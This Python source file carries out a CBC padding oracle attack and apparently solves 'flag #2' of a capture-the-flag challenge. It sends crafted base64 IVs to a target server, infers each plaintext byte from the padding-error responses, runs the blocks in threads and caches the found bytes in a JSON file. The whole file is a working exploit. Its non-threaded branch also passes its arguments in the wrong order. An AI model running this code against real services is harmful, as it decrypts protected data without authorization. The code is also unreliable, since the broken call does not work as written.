'''
Specific for executing a padding oracle attack. Necessary for solving flag #2.
'''


from time import sleep
from settings import CBC_BLOCKSIZE, TARGET, USE_THREADS, NUM_OF_BLOCKS, ORIGINAL_PAYLOAD, SKIPS_FILE_LOCATION
from help import add2bytes, xor2bytes, make_request, replace_chars
from multiprocessing.pool import ThreadPool
from datetime import datetime
from base64 import b64encode
import json
import os


def load_skips():
    '''
    Loads the skips
    '''
    if not os.path.isfile(SKIPS_FILE_LOCATION):
        return None


    with open(SKIPS_FILE_LOCATION, 'r') as skips_file:
        skips = skips_file.read()

        skips = json.loads(skips)
    
    return skips


def save_skips(skips: dict):
    '''
    Saves the skips to a json file
    '''

    with open(SKIPS_FILE_LOCATION, 'w') as skips_file:
        # skips = json.loads((skips))
        skips = json.dumps(skips, sort_keys=True, indent=4)
        skips_file.write(skips)


def __exec_padding_oracle_attack(original_iv: bytes, modifiedDemoData: bytes, num_of_block: int, solutions = None):
    '''
    Executes the padding oracle attack on a block

    original_iv       : The initialization vector to get the plaintext values
    modifiedDemoData  : The block of data from the original message to append after the proposed IV
    num_of_block      : It is just to know what block of plaintext was decrypted to properly concatenate them later
    skips             : The skips for the specific block
    '''

    if not solutions:
        solutions = {}

    original_plaintext = ""
    proposed_iv = [b'\x00']*CBC_BLOCKSIZE
    for num_of_byte in range(-1, -CBC_BLOCKSIZE-1, -1):# Which byte of the IV to test

        what_byte = 0

        if str(num_of_byte) in solutions:
            what_byte = solutions[str(num_of_byte)]

        while True:
            
            # Propose an IV to send
            proposed_iv_temp = proposed_iv.copy()

            # Change the appropriate byte from 0 to 255
            proposed_iv_temp[num_of_byte] = add2bytes(
                proposed_iv_temp[num_of_byte], bytes([what_byte])
            )
            proposed_iv_temp = b''.join(proposed_iv_temp)
            
            # Add the rest of the demo data
            payload_temp = proposed_iv_temp + modifiedDemoData

            # Prepare it for the request
            payload_temp = b64encode(payload_temp)
            payload_temp = payload_temp.decode('utf-8')
            payload_temp = replace_chars(payload_temp, reverse=True)
            
            result = make_request(TARGET, payload_temp)

            print(f"\rBlock #{num_of_block}: On byte #{abs(num_of_byte): >3}/{CBC_BLOCKSIZE} with payload {str(proposed_iv_temp): <67} -> {result}", end='\r')

            if '0' not in result:
                # A propable byte of the IV has been found
                byte_solution = proposed_iv_temp[num_of_byte:]
                
                # Save the solution
                solutions[str(num_of_byte)] = what_byte
                
                # Calculate what valid padding we caused
                caused_valid_padding = bytes([abs(num_of_byte)]*abs(num_of_byte))

                # We can now XOR these bytes (or byte) with the padding we caused to get the intermediary byte
                intermediary = xor2bytes(proposed_iv_temp[num_of_byte:], caused_valid_padding)
                
                original_plaintext = xor2bytes(original_iv[num_of_byte:], intermediary)
                original_plaintext = original_plaintext.decode('utf-8')

                print(f"\nBlock #{num_of_block}: Caught {byte_solution}.\nProgress thus far: <{repr(original_plaintext): >{CBC_BLOCKSIZE+2}}>")

                # Now move on to the next byte, but first make sure to change the byte we found to produce the correct padding on the next try
                if len(caused_valid_padding) > 1:
                    caused_valid_padding = bytes([caused_valid_padding[0]])

                next_valid_padding = add2bytes(caused_valid_padding, b'\x01')*abs(num_of_byte)
                xor_result = xor2bytes(intermediary, next_valid_padding)
                # Replace the appropriate last bytes of the proposed IV
                for xor_res_byte_ind, xor_res_byte in enumerate(xor_result):
                    # This just puts the bytes we found to the last positions of the <proposed_iv>.
                    # This would be easier if python wasn't a bitch with bytes
                    xor_res_byte_ind = xor_res_byte_ind + num_of_byte
                    xor_res_byte = bytes([xor_res_byte])
                    proposed_iv[xor_res_byte_ind] = xor_res_byte
                break
            
            what_byte = what_byte+1
            if what_byte>=256:
                # No solution has been found, something is wrong
                raise Exception("All responses were the same. Have you found the error that talks about the padding?")
    

    return num_of_block, original_plaintext, solutions


def padding_oracle(use_skips: bool = True):

    if USE_THREADS:
        pool = ThreadPool()

    skips = None
    if use_skips:
        skips = load_skips()
    else:
        skips = {}

    plaintext = {}

    dtstart = datetime.now()

    last_block = NUM_OF_BLOCKS-1
    for working_block in range(0, last_block):

        def add_to_rest(result: tuple[int, str, dict]):
            what_block = result[0]
            plaintext_of_block = result[1]
            solutions = result[2]

            nonlocal plaintext
            plaintext.update({what_block: plaintext_of_block})

            nonlocal skips
            skips[str(what_block)] = solutions

        original_iv = ORIGINAL_PAYLOAD[
            working_block*CBC_BLOCKSIZE : (working_block+1)*CBC_BLOCKSIZE
        ]

        # Separate a block of data to use in the payload
        modifiedDemoData = ORIGINAL_PAYLOAD[
            (working_block+1)*CBC_BLOCKSIZE : (working_block+2)*CBC_BLOCKSIZE
        ]

        if USE_THREADS:

            pool.apply_async(
                __exec_padding_oracle_attack,
                (
                    original_iv,
                    modifiedDemoData,
                    working_block,
                    skips[str(working_block)] if skips else None
                ),
                callback=add_to_rest
            )

        else:
            result = __exec_padding_oracle_attack(
                original_iv,
                modifiedDemoData,
                skips[str(working_block)] if skips else skips
            )
            add_to_rest(result)


    if USE_THREADS:
        pool.close()
        pool.join()
    

    if not use_skips:
        save_skips(skips)



    # Combine all the text parts to one string
    text = [""]*len(plaintext)

    for i in plaintext:
        text[i] = plaintext[i]

    text = "".join(text)


    print(f"Result:<|{repr(text)}|>")


    dt = datetime.now() - dtstart
    dt = dt.seconds

    print(f"It took {dt/60} minutes")

    return text
